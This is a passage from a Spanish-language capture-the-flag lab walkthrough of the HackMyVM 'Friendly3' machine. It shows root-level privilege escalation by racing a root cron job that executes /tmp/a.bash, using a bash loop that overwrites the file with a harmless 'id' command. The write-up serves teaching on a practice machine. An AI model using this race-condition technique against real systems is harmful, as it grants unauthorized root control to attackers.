<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly3_bash_ssh_juanSH.png" style="width: 100%;"/>

Tamos dentro :P

# Escalada de privilegios (F3) [#](#friendly3-escalada-de-privilegios) {#friendly3-escalada-de-privilegios}

Recorriendo el sistema, en la ruta `/opt` encontramos un script llamativo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly3_bash_juanSH_cat_optCHECKforINSTALL.png" style="width: 100%;"/>

Jmmm, es un script algo raro. Realiza una petición a un recurso con nombre loco, guarda el output en el objeto `/tmp/a.bash`, le da permisos totales al archivo, lo ejecuta y al final lo borra 👀

Algo interesante del script y su funcionamiento es la escritura del archivo `/tmp/a.bash` y su posterior ejecución... Se me ocurre una [**condición de carrera**](https://portswigger.net/web-security/race-conditions), pero primero debemos validar si existe algún usuario que esté ejecutando el script, ya que si sí, podríamos **ganarle** en la generación del archivo `/tmp/a.bash`, modificar su contenido y hacer que ejecute lo que queramos.

Pero lo dicho, validemos si ese script se está llamando (ya sea por una tarea cron o algún proceso externo).

Para ello usaré [pspy](https://github.com/DominicBreuker/pspy), esta herramienta visualiza procesos internos que estén siendo ejecutados en el sistema, así que nos viene de perlas.

La ejecutamos y obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly3_bash_juanSH_pspy.png" style="width: 100%;"/>

Sisisisi, `root` está ejecutando el script cada minuto (bueno, en la captura no se ve el tiempo, pero ya lo saben :P), así que intentemos ser más rápidos que él y hagámonos dueños del sistema.

## ¿Carreritas o qué? [📌](#friendly3-escalada-racecondition) {#friendly3-escalada-racecondition}

Nos creamos un script que genere el archivo `/tmp/a.bash` infinidad de veces, solo hasta que lo interrumpamos. El contenido del archivo como parte de la prueba será que al ser ejecutado, guarde el resultado del comando `id` es el objeto `/tmp/epale.txt`:

```bash
juan@friendly3:~/things$ cat race_curlandbash.sh 
```

```bash
#!/bin/bash

while true
do
    echo "id > /tmp/epale.txt" > /tmp/a.bash
done
```

```bash
juan@friendly3:~/things$ ./race_curlandbash.sh 
```

Y lo dejamos ahí, incluso podemos mediante **SSH** obtener otra terminal y desde ahí monitorear que va pasando.

Recuerda, cada minuto es ejecutado el script, por lo que después de un tiempo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly3_bash_juanSH_raceconditionDONE_epaleTXT.png" style="width: 100%;"/>

EEEEEEEEEEEEEESOOOOOOOOOOOOO! Estamos ejecutando comandos como `root`, ahora a hacer la tarea (:

# Post Explotación (F3) [#](#friendly2-post-explotacion) {#friendly2-post-explotacion}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HMV/friendly123/Friendly123_friendly3_flags.png" style="width: 100%;"/>

Y liiiiiiiistos, somos amos y dueños de la máquina (:

...

***Y amos y dueños de toooodas las máquinas!***

¿Qué tal te pareció el lab? Lindas máquinas para empezar en este mundo, todo bien "amigable" 🤗

Espero haberme hecho entender con los conceptos, sobre todo con el tema del **pivoting**, igual cualquier duda nos vemos en el Discord del S4vi.

Y bueno, ya me marcho, a dormir bien sabroso, después de este montón de texto 👓

¡A seguir rompiendo de todoooooooooooo!